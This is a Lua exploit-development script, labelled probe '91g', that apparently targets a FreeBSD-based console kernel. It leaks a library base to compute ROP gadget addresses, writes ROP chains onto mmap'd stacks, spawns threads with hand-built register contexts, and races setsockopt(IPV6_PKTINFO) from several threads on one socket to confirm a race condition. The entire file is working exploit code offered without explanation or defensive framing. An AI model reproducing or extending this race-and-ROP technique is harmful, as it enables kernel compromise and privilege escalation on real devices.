-- CRASH_CLASS: MODERATE
-- PROBE 91g: Verify child actually calls setsockopt(PKTINFO)
--
-- 91d-91f showed marker=1 (main last) but never caught child's marker=2.
-- This: spawn child, DON'T race, just wait and check if marker changes.
-- Then: try 4 children on same socket for maximum overlap.

print("=== PROBE 91g: CHILD VERIFY + MULTI-THREAD ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDX=uint64(string.format("0x%X%08X",ehi,elo+0x3B02D7))

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R8=0x068;local _R10=0x090;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local PV6=41; local PKTINFO=46

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end

local function get_marker(s6)
    local gb=memory.alloc(32); z(gb,32)
    local gl=memory.alloc(4); wd(gl,20)
    local rv=N(native.fcall_with_rax(stub,118,s6,PV6,PKTINFO,N(gb),N(gl)))
    if rv~=0 then return nil end
    return rd(gb)
end

-- Helper: build setsockopt child chain
local function build_chain(s6, marker, ncycles)
    local STSZ=ncycles*40+200
    STSZ=math.ceil(STSZ/0x4000)*0x4000
    local ok_s,stk=pcall(function()
        return mm(uint64(0),uint64(STSZ),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok_s then return nil,nil,nil end

    local pi=memory.alloc(20); z(pi,20); wd(pi,marker)

    local off=0
    for i=1,ncycles do
        wq(stk+off,PRDX); off=off+8
        wq(stk+off,uint64(PKTINFO)); off=off+8
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(105)); off=off+8
        wq(stk+off,SA); off=off+8
    end
    local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(N(ts))); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8
    return stk, pi, ncycles
end

local function spawn(s6, stk, pi)
    local ctx=memory.alloc(0x200); z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(N(stk)))
    wq(ctx+_AX,uint64(105))
    wq(ctx+_DI,uint64(s6))
    wq(ctx+_SI,uint64(PV6))
    wq(ctx+_DX,uint64(PKTINFO))
    wq(ctx+_R10,uint64(N(pi)))
    wq(ctx+_R8,uint64(20))
    local tb=memory.alloc(8); wq(tb,uint64(0))
    local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb), ok_t and N(rv_t) or -1
end

-- ============================================================
-- TEST A: Single child, no race, verify marker change
-- ============================================================
print("--- A: CHILD VERIFY ---")
local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)
if s6<=0 then print("BLOCKED") return end

-- Set baseline=77
local p0=memory.alloc(20); z(p0,20); wd(p0,77)
native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(p0),20)
local mk0=get_marker(s6)
print("before: marker="..tostring(mk0))

-- Spawn child (marker=2, 100 cycles — small test)
local stk1,pi1=build_chain(s6, 2, 100)
if not stk1 then print("FAIL chain") return end
local tid1,rv1=spawn(s6,stk1,pi1)
print("thr_create rv="..rv1.." tid="..q(tid1))

-- Wait 10ms
local sl=memory.alloc(16); wq(sl,uint64(0)); wq(sl+8,uint64(10000000))
native.fcall_with_rax(stub,240,N(sl),0)

local mk1=get_marker(s6)
print("after 10ms: marker="..tostring(mk1))
print("child alive="..tostring(alive(tid1)))

if mk1==2 then
    print("CHILD SETSOCKOPT WORKS!")
elseif mk1==77 then
    print("CHILD DID NOT SET PKTINFO")
else
    print("unexpected marker="..tostring(mk1))
end

if tid1 and N(tid1)>0 then pcall(function() tk(tid1,uint64(9)) end) end

-- ============================================================
-- TEST B: 4 children racing each other on same socket
-- ============================================================
print("")
print("--- B: 4-THREAD RACE ---")

-- Reset baseline
z(p0,20); wd(p0,77)
native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(p0),20)

-- Build 4 chains with different markers (3,4,5,6)
local tids={}
for t=1,4 do
    local stk,pi=build_chain(s6, t+2, 6548)
    if not stk then print("FAIL chain "..t) break end
    local tid,rv=spawn(s6,stk,pi)
    tids[t]=tid
    print("  T"..t..": rv="..rv.." tid="..q(tid))
end

-- Main thread also races: marker=1, 50K iterations
local pi_m=memory.alloc(20); z(pi_m,20); wd(pi_m,1)
local m_ok,m_fail=0,0
local samples={}
for i=1,50000 do
    local rv=N(native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(pi_m),20))
    if rv==0 then m_ok=m_ok+1 else m_fail=m_fail+1 end
    if i%1000==0 then
        local mk=get_marker(s6)
        table.insert(samples,mk or -1)
    end
end

local mk_end=get_marker(s6)
print("main: ok="..m_ok.." fail="..m_fail.." mk="..tostring(mk_end))

-- Print sample history
local sh=""
for _,v in ipairs(samples) do sh=sh..v.." " end
print("samples(1K): "..sh)

-- Check children
for t=1,#tids do
    print("  T"..t.." alive="..tostring(alive(tids[t])))
    if tids[t] and N(tids[t])>0 then pcall(function() tk(tids[t],uint64(9)) end) end
end

print("")
native.fcall_with_rax(stub,6,s6)
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91g DONE ===")
